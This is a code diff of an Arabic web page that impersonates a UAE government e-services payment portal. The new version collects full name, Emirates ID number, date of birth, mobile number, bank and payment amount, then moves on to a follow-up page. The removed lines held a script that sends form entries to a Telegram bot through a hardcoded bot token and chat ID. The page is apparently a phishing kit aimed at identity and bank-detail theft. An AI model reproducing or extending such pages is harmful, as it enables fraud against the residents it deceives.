@@ -1,60 +1,141 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>نموذج سداد</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
   <style>
-    body {font-family: Tahoma, Arial; background:#fdfdfd; margin:0; padding:0;}
-    .container {max-width:400px; margin:50px auto; background:#fff5f0; padding:25px; border-radius:12px; box-shadow:0 4px 8px rgba(0,0,0,0.1);}
-    h2 {text-align:center; color:#c15c37; margin-bottom:20px;}
-    label {display:block; margin-bottom:8px; font-weight:bold; color:#333;}
-    input, select, button {width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:6px; font-size:15px;}
-    button {background:#c15c37; color:white; font-weight:bold; cursor:pointer; border:none;}
-    button:hover {background:#a74627;}
+    body{font-family:Tahoma,Arial,sans-serif;background:#f6f7fb;margin:0;color:#0f172a}
+    header{text-align:center;padding:22px 20px 14px;background:#fff;color:#111827;border-bottom:1px solid #ddd}
+    header img{height:80px;display:block;margin:auto}
+    header h2{margin:10px 0 4px;font-weight:800}
+    header p{margin:0;color:#1f2937;opacity:.95}
+    main{padding:20px}
+    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:12px;
+         box-shadow:0 0 8px rgba(0,0,0,.12);border:1px solid #e5e7eb}
+    label{display:block;margin-top:14px;font-weight:700}
+    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #cbd5e1;border-radius:8px;
+                        font-size:14px;background:#fff;outline:none}
+    .row{display:flex;gap:10px}.row>*{flex:1}
+    button{background:#1f2937;color:#fff;border:0;font-weight:800;cursor:pointer;margin-top:10px}
+    button:hover{filter:brightness(1.05)}
+    footer{margin-top:30px;background:#1f2937;color:#fff}
+    .foot-wrap{max-width:1000px;margin:auto;padding:28px 20px;display:flex;flex-wrap:wrap;
+               justify-content:space-between;align-items:center;gap:18px;border-top:4px solid #0f172a}
+    .foot-links{display:flex;gap:16px;flex-wrap:wrap}
+    .foot-links a{color:#fff;text-decoration:none;font-weight:bold}
+    .copy{font-size:13px;opacity:.9;flex:1 1 100%;text-align:center;margin-top:6px}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>سداد</h2>
-    <label for="amount">أدخل قيمة السداد / الاسترداد</label>
-    <input type="text" id="amount" placeholder="مثال: 1000">
+  <header>
+    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663155633084/bGikwtyATlwcCCzm.jpg" alt="الشعار">
+    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+    <p>حكومة الإمارات العربية المتحدة</p>
+  </header>
 
-    <label for="bank">اختر البنك الخاص بك</label>
-    <select id="bank">
-      <option disabled selected>-- اختر البنك --</option>
-      <option>بنك أبوظبي الإسلامي</option>
-      <option>بنك أبوظبي التجاري</option>
-      <option>بنك المشرق</option>
-      <option>بنك الشارقة</option>
-      <option>بنك المارية المحلي</option>
-      <option>بنك عجمان</option>
-      <option>بنك دبي الإسلامي</option>
-      <option>بنك الامارات الاسلامي</option>
-      <option>بنك أبوظبي الأول</option>
-      <option>مصرف الهلال</option>
-    </select>
+  <main>
+    <form id="mainForm" autocomplete="off" novalidate>
+      <label for="fullName">الاسم بالكامل *</label>
+      <input id="fullName" required>
 
-    <button onclick="sendData()">تأكيد</button>
-  </div>
+      <label for="idNumber">رقم الهوية *</label>
+      <input id="idNumber" type="text" inputmode="numeric" maxlength="15" required
+             oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,15)">
+
+      <label>تاريخ الميلاد *</label>
+      <div class="row">
+        <select id="day" required>
+          <option value="">اليوم</option>
+          <script>for(let i=1;i<=31;i++){document.write(`<option>${i}</option>`);}</script>
+        </select>
+        <select id="month" required>
+          <option value="">الشهر</option>
+          <script>for(let i=1;i<=12;i++){document.write(`<option>${i}</option>`);}</script>
+        </select>
+        <input id="year" type="text" inputmode="numeric" maxlength="4" required
+               oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
+      </div>
+
+      <label for="mobile">رقم الجوال *</label>
+      <input id="mobile" type="text" inputmode="numeric" maxlength="10" required
+             oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)">
+
+      <label for="bank">ادخل البنك الخاص بك *</label>
+      <select id="bank" required>
+        <option value="">— اختر البنك —</option>
+        <option>بنك أبوظبي الأول</option>
+        <option>بنك أبوظبي التجاري</option>
+        <option>مصرف أبوظبي الإسلامي</option>
+        <option>بنك الإمارات دبي الوطني</option>
+        <option>بنك دبي الإسلامي</option>
+        <option>بنك دبي التجاري</option>
+        <option>بنك المشرق</option>
+        <option>مصرف الشارقة الإسلامي</option>
+        <option>بنك عجمان</option>
+        <option>مصرف الهلال</option>
+        <option>بنك رأس الخيمة الوطني</option>
+        <option>بنك الفجيرة الوطني</option>
+        <option>البنك العربي المتحد</option>
+        <option>بنك أم القيوين الوطني</option>
+        <option>بنك الشارقة</option>
+        <option>البنك التجاري الدولي</option>
+        <option>HSBC الإمارات</option>
+        <option>ستاندرد تشارترد</option>
+        <option>سيتي بنك</option>
+        <option>الإمارات الإسلامي</option>
+        <option>Liv</option>
+        <option>المارية المحلي</option>
+        <option>Wio Bank</option>
+      </select>
+
+      <label for="amount">قيمة رسوم السداد (درهم إماراتي) *</label>
+      <input id="amount" type="number" min="1" step="0.01" required>
+
+      <label for="invoiceNumber">(رقم المفوتر) *</label>
+      <input id="invoiceNumber" type="text" inputmode="numeric" maxlength="6" required
+             oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6)">
+
+      <button type="submit">متابعة</button>
+    </form>
+  </main>
+
+  <footer>
+    <div class="foot-wrap">
+      <div class="foot-links">
+        <a href="#">سياسة الخصوصية</a>
+        <a href="#">شروط الاستخدام</a>
+        <a href="#">الدعم الفني</a>
+      </div>
+      <div class="copy">© جميع الحقوق محفوظة 2025 • بوابة الخدمات الإلكترونية</div>
+    </div>
+  </footer>
 
   <script>
-    const BOT_TOKEN = "7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E";
-    const CHAT_ID = "16420566";
+    document.getElementById('mainForm').addEventListener('submit', (e)=>{
+      e.preventDefault();
 
-    function sendData() {
-      const amount = document.getElementById("amount").value;
-      const bank = document.getElementById("bank").value;
+      const idNumber = document.getElementById('idNumber').value.trim();
+      if (!/^784\d{12}$/.test(idNumber)) {
+        alert("رقم الهوية يجب أن يبدأ بـ 784 ويكون 15 رقمًا");
+        return;
+      }
 
-      const message = `💰 سداد جديد:\nالمبلغ: ${amount}\nالبنك: ${bank}`;
+      const mobile = document.getElementById('mobile').value.trim();
+      if (!/^05\d{8}$/.test(mobile)) {
+        alert("رقم الجوال يجب أن يبدأ بـ 05 ويكون 10 أرقام");
+        return;
+      }
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: message})
-      }).then(() => {
-        window.location.href = "payment.html";
-      });
-    }
+      const year = document.getElementById('year').value.trim();
+      if (!/^\d{4}$/.test(year) || parseInt(year,10) > 2026) {
+        alert("السنة يجب أن تكون 4 أرقام ولا تتجاوز 2026");
+        return;
+      }
+
+      // متابعة للصفحة التالية
+      window.location.href = "second.html";
+    });
   </script>
 </body>
 </html>
